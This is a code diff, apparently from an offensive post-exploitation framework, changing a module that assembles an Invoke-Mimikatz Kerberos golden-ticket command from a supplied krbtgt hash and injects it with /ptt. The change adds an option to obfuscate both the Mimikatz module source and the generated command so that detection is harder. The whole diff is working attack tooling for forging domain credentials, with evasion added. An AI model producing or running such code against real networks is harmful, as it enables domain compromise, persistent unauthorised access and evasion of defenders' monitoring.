@@ -98,11 +98,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -139,13 +141,15 @@ class Module:
             print helpers.color("[!] krbtgt hash not specified")
 
         # build the golden ticket command        
-        script += "Invoke-Mimikatz -Command '\"kerberos::golden"
+        scriptEnd = "Invoke-Mimikatz -Command '\"kerberos::golden"
 
         for option,values in self.options.iteritems():
             if option.lower() != "agent" and option.lower() != "credid":
                 if values['Value'] and values['Value'] != '':
-                    script += " /" + str(option) + ":" + str(values['Value']) 
+                    scriptEnd += " /" + str(option) + ":" + str(values['Value']) 
 
-        script += " /ptt\"'"
-        
+        scriptEnd += " /ptt\"'"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
